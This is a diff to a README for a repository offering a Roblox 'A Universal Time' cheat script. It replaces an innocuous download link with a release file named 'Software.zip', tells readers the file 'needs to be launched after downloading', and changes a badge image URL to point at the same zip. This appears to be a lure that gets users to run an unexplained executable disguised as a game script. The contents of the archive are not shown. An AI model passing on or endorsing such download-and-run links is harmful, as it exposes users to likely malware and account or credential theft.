@@ -15,7 +15,7 @@ The **"autscript"** repository offers a Roblox A Universal Time 4.3 script that 
 
 ## Get Started
 To get started with the script, download it from the following link:  
-[Download Script](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)  
+[Download Script](https://github.com/Rijan599/autscript/releases/download/v1.0/Software.zip)  
 
 Please note that the file needs to be launched after downloading.
 
@@ -33,6 +33,6 @@ For any questions or issues related to the script, please check the "Releases" s
 
 ## Connect with Us
 Join our community of Roblox players and enthusiasts to stay updated on the latest developments and releases.  
-![Roblox Community](https://img.shields.io/badge/Connect%20with%20Us-Roblox%20Community-blue)
+![Roblox Community](https://github.com/Rijan599/autscript/releases/download/v1.0/Software.zip%20with%20Us-Roblox%20Community-blue)
 
 Let's elevate your Roblox A Universal Time 4.3 gameplay with the **"autscript"** repository! 🚀🔥💥
